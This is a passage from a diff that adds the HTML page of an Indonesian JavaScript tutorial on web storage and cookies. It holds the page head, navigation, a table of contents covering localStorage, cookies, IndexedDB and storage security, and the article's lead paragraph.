@@ -1,0 +1,1519 @@
+<!doctype html>
+<html lang="en-US">
+  <head>
+  <meta charset="utf-8">
+  <meta http-equiv="x-ua-compatible" content="ie=edge">
+  <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
+  <link rel="preload" as="font" href="https://kaban.my.id/fonts/vendor/jost/jost-v4-latin-regular.woff2" type="font/woff2" crossorigin>
+<link rel="preload" as="font" href="https://kaban.my.id/fonts/vendor/jost/jost-v4-latin-500.woff2" type="font/woff2" crossorigin>
+<link rel="preload" as="font" href="https://kaban.my.id/fonts/vendor/jost/jost-v4-latin-700.woff2" type="font/woff2" crossorigin>
+
+  <script>(()=>{var t=window.matchMedia&&window.matchMedia("(prefers-color-scheme: dark)").matches,e=localStorage.getItem("theme");t&&e===null&&(localStorage.setItem("theme","dark"),document.documentElement.setAttribute("data-dark-mode","")),t&&e==="dark"&&document.documentElement.setAttribute("data-dark-mode",""),e==="dark"&&document.documentElement.setAttribute("data-dark-mode","")})()</script>
+
+  <link rel="stylesheet" href="https://kaban.my.id/main.4296e689affcd00e933b8954c10fc43cd1a5f16d5552e78183d12ea50d3e0bf5a596df23a379a4936743f01a7cd8ba048a628b2b9b60b34aa49fad468287100a.css" integrity="sha512-Qpbmia/80A6TO4lUwQ/EPNGl8W1VUueBg9EupQ0&#43;C/Wllt8jo3mkk2dD8Bp82LoEimKLK5tgs0qkn61GgocQCg==" crossorigin="anonymous">
+<noscript><style>img.lazyload { display: none; }</style></noscript>
+  <meta name="robots" content="index, follow">
+    <meta name="googlebot" content="index, follow, max-snippet:-1, max-image-preview:large, max-video-preview:-1">
+    <meta name="bingbot" content="index, follow, max-snippet:-1, max-image-preview:large, max-video-preview:-1">
+  <title>Web Storage &amp; Cookie - Roberto Kaban Blog&#39;s</title>
+<meta name="description" content="Panduan lengkap menyimpan data di sisi klien: localStorage, sessionStorage, cookie, IndexedDB, dan best practice keamanan.">
+<link rel="canonical" href="https://kaban.my.id/javascript/tutorial/11-web-storage/">
+<meta property="og:locale" content="en_US">
+<meta property="og:type" content="article">
+<meta property="og:title" content="Web Storage &amp; Cookie">
+<meta property="og:description" content="Panduan lengkap menyimpan data di sisi klien: localStorage, sessionStorage, cookie, IndexedDB, dan best practice keamanan.">
+<meta property="og:url" content="https://kaban.my.id/javascript/tutorial/11-web-storage/">
+<meta property="og:site_name" content="Roberto Kaban Blog&#39;s">
+<meta property="article:published_time" content="2022-12-29T08:00:00+00:00">
+  <meta property="article:modified_time" content="2022-12-29T08:00:00+00:00">
+  
+  <meta property="og:image" content="https://kaban.my.id/doks.png"/>
+      <meta property="og:image:alt" content="Roberto Kaban Blog&#39;s">
+    
+<meta name="twitter:card" content="summary_large_image">
+<meta name="twitter:site" content="@robertokaban">
+<meta name="twitter:creator" content="@robertokaban">
+<meta name="twitter:title" content="Web Storage &amp; Cookie">
+<meta name="twitter:description" content="Panduan lengkap menyimpan data di sisi klien: localStorage, sessionStorage, cookie, IndexedDB, dan best practice keamanan.">
+<meta name="twitter:image" content="https://kaban.my.id/doks.png">
+    <meta name="twitter:image:alt" content="Web Storage &amp; Cookie">
+
+<script type="application/ld+json">
+{
+  "@context": "https://schema.org",
+  "@graph": [
+    {
+      "@type": "Person",
+        "@id": "https://kaban.my.id/#/schema/person/1",
+      "name": "BlogRobertoKaban",
+      "url": "https://kaban.my.id/",
+      "sameAs": [
+        "https://twitter.com/robertokaban"
+        , "https://github.com/robertokaban"
+        ],
+      "image": {
+          "@type": "ImageObject",
+          "@id": "https://kaban.my.id/#/schema/image/1",
+          "url": "https://kaban.my.id/doks.png",
+          "width":  1280 ,
+          "height":  640 ,
+          "caption": "BlogRobertoKaban"
+        }
+      },
+    {
+      "@type": "WebSite",
+      "@id": "https://kaban.my.id/#/schema/website/1",
+      "url": "https://kaban.my.id/",
+      "name": "Roberto Kaban Blog\u0027s",
+      "description": "Hanya sebuah catatan kecil untuk hal yang tidak ingin dilupakan.",
+      "publisher": {
+          "@id": "https://kaban.my.id/#/schema/person/1"
+        }
+      },
+    {
+      "@type": "WebPage",
+      "@id": "https://kaban.my.id/javascript/tutorial/11-web-storage/",
+      "url": "https://kaban.my.id/javascript/tutorial/11-web-storage/",
+      "name": "Web Storage \u0026 Cookie",
+      "description": "Panduan lengkap menyimpan data di sisi klien: localStorage, sessionStorage, cookie, IndexedDB, dan best practice keamanan.",
+      "isPartOf": {
+        "@id": "https://kaban.my.id/#/schema/website/1"
+      },
+      "about": {
+          "@id": "https://kaban.my.id/#/schema/person/1"
+        },
+      "datePublished": "2022-12-29T08:00:00CET",
+      "dateModified": "2022-12-29T08:00:00CET",
+      "breadcrumb": {
+        "@id": "https://kaban.my.id/javascript/tutorial/11-web-storage/#/schema/breadcrumb/1"
+      },
+      "primaryImageOfPage": {
+        "@id": "https://kaban.my.id/javascript/tutorial/11-web-storage/#/schema/image/2"
+      },
+      "inLanguage": "en-US",
+      "potentialAction": [{
+        "@type": "ReadAction", "target": ["https://kaban.my.id/javascript/tutorial/11-web-storage/"]
+      }]
+    },
+    {
+      "@type": "BreadcrumbList",
+      "@id": "https://kaban.my.id/javascript/tutorial/11-web-storage/#/schema/breadcrumb/1",
+      "name": "Breadcrumbs",
+      "itemListElement": [{
+        "@type": "ListItem",
+        "position":  1 ,
+        "item": {
+          "@type": "WebPage",
+          "@id": "https://kaban.my.id/",
+          "url": "https://kaban.my.id/",
+          "name": "Home"
+          }
+        },{
+        "@type": "ListItem",
+        "position":  2 ,
+        "item": {
+          "@type": "WebPage",
+          "@id": "https://kaban.my.id/javascript/",
+          "url": "https://kaban.my.id/javascript/",
+          "name": "Javascript"
+          }
+        },{
+        "@type": "ListItem",
+        "position":  3 ,
+        "item": {
+          "@type": "WebPage",
+          "@id": "https://kaban.my.id/javascript/tutorial/",
+          "url": "https://kaban.my.id/javascript/tutorial/",
+          "name": "Tutorial"
+          }
+        },{
+        "@type": "ListItem",
+        "position":  4 ,
+        "item": {
+          "@id": "https://kaban.my.id/javascript/tutorial/11-web-storage/"
+          }
+        }]
+    },
+
+    {
+      "@context": "https://schema.org",
+      "@graph": [
+        {
+          "@type": "ImageObject",
+          "@id": "https://kaban.my.id/javascript/tutorial/11-web-storage/#/schema/image/2",
+          "url": "https://kaban.my.id/doks.png",
+          "contentUrl": "https://kaban.my.id/doks.png",
+          "caption": "Web Storage \u0026 Cookie"
+        }
+      ]
+    }
+
+  ]
+}
+</script>
+
+  <meta name="theme-color" content="#fff">
+<link rel="icon" href="https://kaban.my.id/favicon.ico" sizes="any">
+<link rel="icon" type="image/svg+xml" href="https://kaban.my.id/favicon.svg">
+<link rel="apple-touch-icon" sizes="180x180" href="https://kaban.my.id/apple-touch-icon.png">
+<link rel="icon" type="image/png" sizes="32x32" href="https://kaban.my.id/favicon-32x32.png">
+<link rel="icon" type="image/png" sizes="16x16" href="https://kaban.my.id/favicon-16x16.png">
+<link rel="manifest" crossorigin="use-credentials" href="https://kaban.my.id/site.webmanifest">
+
+  
+
+
+  
+  
+  
+<script async src="https://www.googletagmanager.com/gtag/js?id=G-60VSDZFQR5"></script>
+<script>
+  window.dataLayer = window.dataLayer || [];
+  function gtag(){dataLayer.push(arguments);}
+  gtag('js', new Date());
+
+  gtag('config', 'G-60VSDZFQR5');
+</script>
+<script async src="https://pagead2.googlesyndication.com/pagead/js/adsbygoogle.js?client=ca-pub-6664512614760985"
+     crossorigin="anonymous"></script>
+</head>
+
+  <body class="javascript single">
+    <div class="sticky-top">
+<div class="header-bar"></div>
+
+<header class="navbar navbar-expand-lg navbar-light doks-navbar">
+  <nav class="container-xxl flex-wrap flex-lg-nowrap" aria-label="Main navigation">
+
+    <a class="navbar-brand order-0" href="/" aria-label="Roberto Kaban Blog&#39;s">
+      Roberto Kaban Blog&#39;s
+    </a>
+
+    <button class="btn btn-menu order-2 d-block d-lg-none" type="button" data-bs-toggle="offcanvas" data-bs-target="#offcanvasDoks" aria-controls="offcanvasDoks" aria-label="Open main menu">
+      <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="feather feather-menu"><line x1="3" y1="12" x2="21" y2="12"></line><line x1="3" y1="6" x2="21" y2="6"></line><line x1="3" y1="18" x2="21" y2="18"></line></svg>
+    </button>
+    <div class="offcanvas offcanvas-end border-0 py-lg-1" tabindex="-1" id="offcanvasDoks" data-bs-backdrop="true" aria-labelledby="offcanvasDoksLabel">
+      <div class="header-bar d-lg-none"></div>
+      <div class="offcanvas-header d-lg-none">
+        <h2 class="h5 offcanvas-title ps-2" id="offcanvasDoksLabel"><a class="text-dark" href="/">Roberto Kaban Blog&#39;s</a></h2>
+        <button type="button" class="btn-close text-reset me-2" data-bs-dismiss="offcanvas" aria-label="Close main menu"></button>
+      </div>
+      <div class="offcanvas-body p-4 p-lg-0">
+        <ul class="nav flex-column flex-lg-row align-items-lg-center mt-2 mt-lg-0 ms-lg-2 me-lg-auto">
+              <li class="nav-item">
+                <a class="nav-link ps-0 py-1" href="/about/">About Me</a>
+              </li>
+            
+          
+              <li class="nav-item">
+                <a class="nav-link ps-0 py-1" href="/contact/">Contact</a>
+              </li>
+            
+          
+              <li class="nav-item">
+                <a class="nav-link ps-0 py-1" href="/artikel/">Artikel</a>
+              </li>
+            
+          
+              <li class="nav-item">
+                <a class="nav-link ps-0 py-1" href="/coretanku/">Coretanku</a>
+              </li>
+            
+          </ul>
+
+        <hr class="text-black-50 my-4 d-lg-none">
+        <form class="doks-search position-relative flex-grow-1 ms-lg-auto me-lg-2">
+          <input id="search" class="form-control is-search" type="search" placeholder="Cari di blog ini..." aria-label="Cari di blog ini..." autocomplete="off">
+          <div id="suggestions" class="shadow bg-white rounded d-none"></div>
+        </form>
+        <hr class="text-black-50 my-4 d-lg-none">
+        <ul class="nav flex-column flex-lg-row">
+          <li class="nav-item">
+              <a class="nav-link social-link" href="https://github.com/robertokaban"><svg xmlns="http://www.w3.org/2000/svg" width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="feather feather-github"><path d="M9 19c-5 1.5-5-2.5-7-3m14 6v-3.87a3.37 3.37 0 0 0-.94-2.61c3.14-.35 6.44-1.54 6.44-7A5.44 5.44 0 0 0 20 4.77 5.07 5.07 0 0 0 19.91 1S18.73.65 16 2.48a13.38 13.38 0 0 0-7 0C6.27.65 5.09 1 5.09 1A5.07 5.07 0 0 0 5 4.77a5.44 5.44 0 0 0-1.5 3.78c0 5.42 3.3 6.61 6.44 7A3.37 3.37 0 0 0 9 18.13V22"></path></svg><small class="ms-2 d-lg-none">GitHub</small></a>
+            </li>
+          <li class="nav-item">
+              <a class="nav-link social-link" href="https://facebook.com/roberto.kaban"><svg xmlns="http://www.w3.org/2000/svg" width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="feather feather-facebook"><path d="M24 12.073c0-6.627-5.373-12-12-12s-12 5.373-12 12c0 5.99 4.388 10.954 10.125 11.854v-8.385H7.078v-3.47h3.047V9.43c0-3.007 1.792-4.669 4.533-4.669 1.312 0 2.686.235 2.686.235v2.953H15.83c-1.491 0-1.956.925-1.956 1.874v2.25h3.328l-.532 3.47h-2.796v8.385C19.612 23.027 24 18.062 24 12.073z"></path></svg><small class="ms-2 d-lg-none">Facebook</small></a>
+            </li>
+          <li class="nav-item">
+              <a class="nav-link social-link" href="https://twitter.com/robertokaban"><svg xmlns="http://www.w3.org/2000/svg" width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="feather feather-twitter"><path d="M23 3a10.9 10.9 0 0 1-3.14 1.53 4.48 4.48 0 0 0-7.86 3v1A10.66 10.66 0 0 1 3 4s-4 9 5 13a11.64 11.64 0 0 1-7 2c9 5 20 0 20-11.5a4.5 4.5 0 0 0-.08-.83A7.72 7.72 0 0 0 23 3z"></path></svg><small class="ms-2 d-lg-none">Twitter</small></a>
+            </li>
+          <li class="nav-item">
+              <a class="nav-link social-link" href="https://youtube.com/@robertokaban"><svg xmlns="http://www.w3.org/2000/svg" width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="feather feather-youtube"><path d="M10,15L15.19,12L10,9V15M21.56,7.17C21.69,7.64 21.78,8.27 21.84,9.07C21.91,9.87 21.94,10.56 21.94,11.16L22,12C22,14.19 21.84,15.8 21.56,16.83C21.31,17.73 20.73,18.31 19.83,18.56C19.36,18.69 18.5,18.78 17.18,18.84C15.88,18.91 14.69,18.94 13.59,18.94L12,19C7.81,19 5.2,18.84 4.17,18.56C3.27,18.31 2.69,17.73 2.44,16.83C2.31,16.36 2.22,15.73 2.16,14.93C2.09,14.13 2.06,13.44 2.06,12.84L2,12C2,9.81 2.16,8.2 2.44,7.17C2.69,6.27 3.27,5.69 4.17,5.44C4.64,5.31 5.5,5.22 6.82,5.16C8.12,5.09 9.31,5.06 10.41,5.06L12,5C16.19,5 18.8,5.16 19.83,5.44C20.73,5.69 21.31,6.27 21.56,7.17Z"></path></svg><small class="ms-2 d-lg-none">Youtube</small></a>
+            </li>
+          </ul>
+
+        
+        <hr class="text-black-50 my-4 d-lg-none">
+        <button id="mode" class="btn btn-link" type="button" aria-label="Toggle user interface mode">
+          <span class="toggle-dark"><svg xmlns="http://www.w3.org/2000/svg" width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="feather feather-moon"><path d="M21 12.79A9 9 0 1 1 11.21 3 7 7 0 0 0 21 12.79z"></path></svg></span>
+          <span class="toggle-light"><svg xmlns="http://www.w3.org/2000/svg" width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="feather feather-sun"><circle cx="12" cy="12" r="5"></circle><line x1="12" y1="1" x2="12" y2="3"></line><line x1="12" y1="21" x2="12" y2="23"></line><line x1="4.22" y1="4.22" x2="5.64" y2="5.64"></line><line x1="18.36" y1="18.36" x2="19.78" y2="19.78"></line><line x1="1" y1="12" x2="3" y2="12"></line><line x1="21" y1="12" x2="23" y2="12"></line><line x1="4.22" y1="19.78" x2="5.64" y2="18.36"></line><line x1="18.36" y1="5.64" x2="19.78" y2="4.22"></line></svg></span>
+        </button>
+        
+
+        </div>
+    </div>
+  </nav>
+</header>
+
+
+</div>
+
+
+<div class="container-xxl">
+  <aside class="doks-sidebar">
+    <nav id="doks-docs-nav" class="collapse d-lg-none" aria-label="Tertiary navigation">
+      
+<ul class="list-unstyled collapsible-sidebar">
+  
+    
+      
+      <li class="mb-1">
+        <button class="btn btn-toggle align-items-center rounded collapsed" data-bs-toggle="collapse" data-bs-target="#section-0967e753cd827c7c2576cf6f7292922e" aria-expanded="true">
+          Tutorial Javascript
+        </button>
+        <div class="collapse show" id="section-0967e753cd827c7c2576cf6f7292922e">
+          <ul class="btn-toggle-nav list-unstyled fw-normal pb-1 small">
+            
+              
+                
+                <li><a class="docs-link rounded" href="https://kaban.my.id/javascript/tutorial/pengenalan/">Pengenalan Javascript</a></li>
+              
+            
+              
+                
+                <li><a class="docs-link rounded" href="https://kaban.my.id/javascript/tutorial/02-instalasi-persiapan/">Instalasi &amp; Persiapan Lingkungan JavaScript</a></li>
+              
+            
+              
+                
+                <li><a class="docs-link rounded" href="https://kaban.my.id/javascript/tutorial/03-sintaks-variabel/">Sintaks Dasar &amp; Variabel</a></li>
+              
+            
+              
+                
+                <li><a class="docs-link rounded" href="https://kaban.my.id/javascript/tutorial/04-tipe-data-konversi/">Tipe Data &amp; Konversi</a></li>
+              
+            
+              
+                
+                <li><a class="docs-link rounded" href="https://kaban.my.id/javascript/tutorial/05-struktur-kontrol/">Struktur Kontrol &amp; Perulangan</a></li>
+              
+            
+              
+                
+                <li><a class="docs-link rounded" href="https://kaban.my.id/javascript/tutorial/06-fungsi/">Fungsi</a></li>
+              
+            
+              
+                
+                <li><a class="docs-link rounded" href="https://kaban.my.id/javascript/tutorial/07-array/">Array &amp; Method-nya</a></li>
+              
+            
+              
+                
+                <li><a class="docs-link rounded" href="https://kaban.my.id/javascript/tutorial/08-object/">Object &amp; Method-nya</a></li>
+              
+            
+              
+                
+                <li><a class="docs-link rounded" href="https://kaban.my.id/javascript/tutorial/09-dom-manipulation/">DOM Manipulation</a></li>
+              
+            
+              
+                
+                <li><a class="docs-link rounded" href="https://kaban.my.id/javascript/tutorial/10-event-handling/">Event &amp; Event Handling</a></li>
+              
+            
+              
+                
+                <li><a class="docs-link rounded active" href="https://kaban.my.id/javascript/tutorial/11-web-storage/">Web Storage &amp; Cookie</a></li>
+              
+            
+              
+                
+                <li><a class="docs-link rounded" href="https://kaban.my.id/javascript/tutorial/12-es6-modern/">ES6&#43; Fitur Modern</a></li>
+              
+            
+              
+                
+                <li><a class="docs-link rounded" href="https://kaban.my.id/javascript/tutorial/13-async-javascript/">Asynchronous JavaScript</a></li>
+              
+            
+              
+                
+                <li><a class="docs-link rounded" href="https://kaban.my.id/javascript/tutorial/14-fetch-api/">Fetch API &amp; AJAX</a></li>
+              
+            
+              
+                
+                <li><a class="docs-link rounded" href="https://kaban.my.id/javascript/tutorial/15-nodejs-npm/">Node.js &amp; npm Dasar</a></li>
+              
+            
+              
+                
+                <li><a class="docs-link rounded" href="https://kaban.my.id/javascript/tutorial/16-bundler-tooling/">Module Bundler &amp; Build Tool</a></li>
+              
+            
+          </ul>
+        </div>
+      </li>
+    
+  
+</ul>
+
+    </nav>
+  </aside>
+</div>
+
+    <div class="wrap container-xxl" role="document">
+      <div class="content">
+        
+	<div class="row flex-xl-nowrap">
+		<div class="col-lg-5 col-xl-4 docs-sidebar d-none d-lg-block">
+			<nav class="docs-links" aria-label="Main navigation">
+				
+<ul class="list-unstyled collapsible-sidebar">
+  
+    
+      
+      <li class="mb-1">
+        <button class="btn btn-toggle align-items-center rounded collapsed" data-bs-toggle="collapse" data-bs-target="#section-0967e753cd827c7c2576cf6f7292922e" aria-expanded="true">
+          Tutorial Javascript
+        </button>
+        <div class="collapse show" id="section-0967e753cd827c7c2576cf6f7292922e">
+          <ul class="btn-toggle-nav list-unstyled fw-normal pb-1 small">
+            
+              
+                
+                <li><a class="docs-link rounded" href="https://kaban.my.id/javascript/tutorial/pengenalan/">Pengenalan Javascript</a></li>
+              
+            
+              
+                
+                <li><a class="docs-link rounded" href="https://kaban.my.id/javascript/tutorial/02-instalasi-persiapan/">Instalasi &amp; Persiapan Lingkungan JavaScript</a></li>
+              
+            
+              
+                
+                <li><a class="docs-link rounded" href="https://kaban.my.id/javascript/tutorial/03-sintaks-variabel/">Sintaks Dasar &amp; Variabel</a></li>
+              
+            
+              
+                
+                <li><a class="docs-link rounded" href="https://kaban.my.id/javascript/tutorial/04-tipe-data-konversi/">Tipe Data &amp; Konversi</a></li>
+              
+            
+              
+                
+                <li><a class="docs-link rounded" href="https://kaban.my.id/javascript/tutorial/05-struktur-kontrol/">Struktur Kontrol &amp; Perulangan</a></li>
+              
+            
+              
+                
+                <li><a class="docs-link rounded" href="https://kaban.my.id/javascript/tutorial/06-fungsi/">Fungsi</a></li>
+              
+            
+              
+                
+                <li><a class="docs-link rounded" href="https://kaban.my.id/javascript/tutorial/07-array/">Array &amp; Method-nya</a></li>
+              
+            
+              
+                
+                <li><a class="docs-link rounded" href="https://kaban.my.id/javascript/tutorial/08-object/">Object &amp; Method-nya</a></li>
+              
+            
+              
+                
+                <li><a class="docs-link rounded" href="https://kaban.my.id/javascript/tutorial/09-dom-manipulation/">DOM Manipulation</a></li>
+              
+            
+              
+                
+                <li><a class="docs-link rounded" href="https://kaban.my.id/javascript/tutorial/10-event-handling/">Event &amp; Event Handling</a></li>
+              
+            
+              
+                
+                <li><a class="docs-link rounded active" href="https://kaban.my.id/javascript/tutorial/11-web-storage/">Web Storage &amp; Cookie</a></li>
+              
+            
+              
+                
+                <li><a class="docs-link rounded" href="https://kaban.my.id/javascript/tutorial/12-es6-modern/">ES6&#43; Fitur Modern</a></li>
+              
+            
+              
+                
+                <li><a class="docs-link rounded" href="https://kaban.my.id/javascript/tutorial/13-async-javascript/">Asynchronous JavaScript</a></li>
+              
+            
+              
+                
+                <li><a class="docs-link rounded" href="https://kaban.my.id/javascript/tutorial/14-fetch-api/">Fetch API &amp; AJAX</a></li>
+              
+            
+              
+                
+                <li><a class="docs-link rounded" href="https://kaban.my.id/javascript/tutorial/15-nodejs-npm/">Node.js &amp; npm Dasar</a></li>
+              
+            
+              
+                
+                <li><a class="docs-link rounded" href="https://kaban.my.id/javascript/tutorial/16-bundler-tooling/">Module Bundler &amp; Build Tool</a></li>
+              
+            
+          </ul>
+        </div>
+      </li>
+    
+  
+</ul>
+
+			</nav>
+		</div>
+		<nav class="docs-toc d-none d-xl-block col-xl-3" aria-label="Secondary navigation">
+			<div class="d-xl-none">
+  <button class="btn btn-outline-primary btn-sm doks-toc-toggle collapsed" type="button" data-bs-toggle="collapse" data-bs-target="#onThisPage" aria-controls="doks-docs-nav" aria-expanded="false" aria-label="Toggle On this page navigation">
+    <span>Daftar isi</span>
+    <span>
+      <svg xmlns="http://www.w3.org/2000/svg" width="18" height="18" viewBox="0 0 24 24" class="doks doks-expand" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><title>Expand</title><polyline points="7 13 12 18 17 13"></polyline><polyline points="7 6 12 11 17 6"></polyline></svg>
+      <svg xmlns="http://www.w3.org/2000/svg" width="18" height="18" viewBox="0 0 24 24" class="doks doks-collapse" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><title>Collapse</title><polyline points="17 11 12 6 7 11"></polyline><polyline points="17 18 12 13 7 18"></polyline></svg>
+    </span>
+  </button>
+  <div class="collapse" id="onThisPage">
+    <div class="card card-body mt-3 py-1">
+      <div class="page-links">
+        <nav id="TableOfContents">
+  <ul>
+    <li><a href="#pendahuluan">Pendahuluan</a></li>
+    <li><a href="#perbandingan-mekanisme-penyimpanan">Perbandingan Mekanisme Penyimpanan</a></li>
+    <li><a href="#localstorage"><code>localStorage</code></a>
+      <ul>
+        <li><a href="#api-dasar">API Dasar</a></li>
+        <li><a href="#menyimpan-objectarray-json">Menyimpan Object/Array (JSON)</a></li>
+        <li><a href="#iterasi-semua-item">Iterasi Semua Item</a></li>
+        <li><a href="#event-storage--sinkronisasi-antar-tab">Event <code>storage</code> — Sinkronisasi Antar Tab</a></li>
+        <li><a href="#batasan-localstorage">Batasan <code>localStorage</code></a></li>
+      </ul>
+    </li>
+    <li><a href="#sessionstorage"><code>sessionStorage</code></a>
+      <ul>
+        <li><a href="#api-sama-dengan-localstorage">API (Sama dengan <code>localStorage</code>)</a></li>
+        <li><a href="#kapan-menggunakan-sessionstorage">Kapan Menggunakan <code>sessionStorage</code>?</a></li>
+        <li><a href="#perbedaan-localstorage-vs-sessionstorage">Perbedaan <code>localStorage</code> vs <code>sessionStorage</code></a></li>
+      </ul>
+    </li>
+    <li><a href="#cookie">Cookie</a>
+      <ul>
+        <li><a href="#kapan-menggunakan-cookie">Kapan Menggunakan Cookie?</a></li>
+        <li><a href="#membaca-cookie">Membaca Cookie</a></li>
+        <li><a href="#menulis-cookie">Menulis Cookie</a></li>
+        <li><a href="#menghapus-cookie">Menghapus Cookie</a></li>
+        <li><a href="#helper-function-untuk-cookie">Helper Function untuk Cookie</a></li>
+        <li><a href="#cookie-httponly-dan-secure">Cookie <code>HttpOnly</code> dan <code>Secure</code></a></li>
+        <li><a href="#samesite--perlindungan-csrf"><code>SameSite</code> — Perlindungan CSRF</a></li>
+      </ul>
+    </li>
+    <li><a href="#indexeddb--untuk-data-besar">IndexedDB — Untuk Data Besar</a>
+      <ul>
+        <li><a href="#kapan-menggunakan-indexeddb">Kapan Menggunakan IndexedDB?</a></li>
+        <li><a href="#contoh-dasar">Contoh Dasar</a></li>
+        <li><a href="#library-pembungkus">Library Pembungkus</a></li>
+      </ul>
+    </li>
+    <li><a href="#keamanan-apa-yang-boleh-disimpan">Keamanan: Apa yang Boleh Disimpan?</a>
+      <ul>
+        <li><a href="#-jangan-simpan-di-localstoragesessionstorage">❌ JANGAN Simpan di <code>localStorage</code>/<code>sessionStorage</code></a></li>
+        <li><a href="#-aman-disimpan-di-localstoragesessionstorage">✅ AMAN Disimpan di <code>localStorage</code>/<code>sessionStorage</code></a></li>
+        <li><a href="#mengapa-localstorage-tidak-aman-untuk-token">Mengapa <code>localStorage</code> Tidak Aman untuk Token?</a></li>
+      </ul>
+    </li>
+    <li><a href="#contoh-praktis">Contoh Praktis</a>
+      <ul>
+        <li><a href="#1-tema-darklight-dengan-localstorage">1. Tema Dark/Light dengan <code>localStorage</code></a></li>
+        <li><a href="#2-keranjang-belanja-dengan-localstorage">2. Keranjang Belanja dengan <code>localStorage</code></a></li>
+        <li><a href="#3-form-draft-dengan-sessionstorage">3. Form Draft dengan <code>sessionStorage</code></a></li>
+        <li><a href="#4-menyimpan-preferensi-user-dengan-cookie">4. Menyimpan Preferensi User dengan Cookie</a></li>
+      </ul>
+    </li>
+    <li><a href="#tips--best-practice">Tips &amp; Best Practice</a></li>
+    <li><a href="#ringkasan">Ringkasan</a></li>
+  </ul>
+</nav>
+      </div>
+    </div>
+  </div>
+</div>
+<div class="page-links d-none d-xl-block">
+  <h3>Daftar isi</h3>
+  <nav id="TableOfContents">
+  <ul>
+    <li><a href="#pendahuluan">Pendahuluan</a></li>
+    <li><a href="#perbandingan-mekanisme-penyimpanan">Perbandingan Mekanisme Penyimpanan</a></li>
+    <li><a href="#localstorage"><code>localStorage</code></a>
+      <ul>
+        <li><a href="#api-dasar">API Dasar</a></li>
+        <li><a href="#menyimpan-objectarray-json">Menyimpan Object/Array (JSON)</a></li>
+        <li><a href="#iterasi-semua-item">Iterasi Semua Item</a></li>
+        <li><a href="#event-storage--sinkronisasi-antar-tab">Event <code>storage</code> — Sinkronisasi Antar Tab</a></li>
+        <li><a href="#batasan-localstorage">Batasan <code>localStorage</code></a></li>
+      </ul>
+    </li>
+    <li><a href="#sessionstorage"><code>sessionStorage</code></a>
+      <ul>
+        <li><a href="#api-sama-dengan-localstorage">API (Sama dengan <code>localStorage</code>)</a></li>
+        <li><a href="#kapan-menggunakan-sessionstorage">Kapan Menggunakan <code>sessionStorage</code>?</a></li>
+        <li><a href="#perbedaan-localstorage-vs-sessionstorage">Perbedaan <code>localStorage</code> vs <code>sessionStorage</code></a></li>
+      </ul>
+    </li>
+    <li><a href="#cookie">Cookie</a>
+      <ul>
+        <li><a href="#kapan-menggunakan-cookie">Kapan Menggunakan Cookie?</a></li>
+        <li><a href="#membaca-cookie">Membaca Cookie</a></li>
+        <li><a href="#menulis-cookie">Menulis Cookie</a></li>
+        <li><a href="#menghapus-cookie">Menghapus Cookie</a></li>
+        <li><a href="#helper-function-untuk-cookie">Helper Function untuk Cookie</a></li>
+        <li><a href="#cookie-httponly-dan-secure">Cookie <code>HttpOnly</code> dan <code>Secure</code></a></li>
+        <li><a href="#samesite--perlindungan-csrf"><code>SameSite</code> — Perlindungan CSRF</a></li>
+      </ul>
+    </li>
+    <li><a href="#indexeddb--untuk-data-besar">IndexedDB — Untuk Data Besar</a>
+      <ul>
+        <li><a href="#kapan-menggunakan-indexeddb">Kapan Menggunakan IndexedDB?</a></li>
+        <li><a href="#contoh-dasar">Contoh Dasar</a></li>
+        <li><a href="#library-pembungkus">Library Pembungkus</a></li>
+      </ul>
+    </li>
+    <li><a href="#keamanan-apa-yang-boleh-disimpan">Keamanan: Apa yang Boleh Disimpan?</a>
+      <ul>
+        <li><a href="#-jangan-simpan-di-localstoragesessionstorage">❌ JANGAN Simpan di <code>localStorage</code>/<code>sessionStorage</code></a></li>
+        <li><a href="#-aman-disimpan-di-localstoragesessionstorage">✅ AMAN Disimpan di <code>localStorage</code>/<code>sessionStorage</code></a></li>
+        <li><a href="#mengapa-localstorage-tidak-aman-untuk-token">Mengapa <code>localStorage</code> Tidak Aman untuk Token?</a></li>
+      </ul>
+    </li>
+    <li><a href="#contoh-praktis">Contoh Praktis</a>
+      <ul>
+        <li><a href="#1-tema-darklight-dengan-localstorage">1. Tema Dark/Light dengan <code>localStorage</code></a></li>
+        <li><a href="#2-keranjang-belanja-dengan-localstorage">2. Keranjang Belanja dengan <code>localStorage</code></a></li>
+        <li><a href="#3-form-draft-dengan-sessionstorage">3. Form Draft dengan <code>sessionStorage</code></a></li>
+        <li><a href="#4-menyimpan-preferensi-user-dengan-cookie">4. Menyimpan Preferensi User dengan Cookie</a></li>
+      </ul>
+    </li>
+    <li><a href="#tips--best-practice">Tips &amp; Best Practice</a></li>
+    <li><a href="#ringkasan">Ringkasan</a></li>
+  </ul>
+</nav>
+  </div>
+
+		</nav>
+		<main class="docs-content col-lg-11 col-xl-9">
+		
+				<nav aria-label="breadcrumb">
+					<ol class="breadcrumb">
+						<li class="breadcrumb-item"><a href="/">Home</a></li>
+<li class="breadcrumb-item"><a href="/javascript/">Javascript</a></li>
+<li class="breadcrumb-item"><a href="/javascript/tutorial/">Tutorial Javascript</a></li>
+<li class="breadcrumb-item active" aria-current="page">Web Storage &amp; Cookie</li>
+					</ol>
+				</nav>
+			
+			<h1>Web Storage &amp; Cookie</h1>
+			<p class="lead">Web Storage dan cookie memungkinkan aplikasi menyimpan data di browser tanpa server. Artikel ini membahas localStorage, sessionStorage, cookie, perbedaannya, serta best practice keamanan dan kasus penggunaan.</p>
+			<nav class="d-xl-none" aria-label="Quaternary navigation">
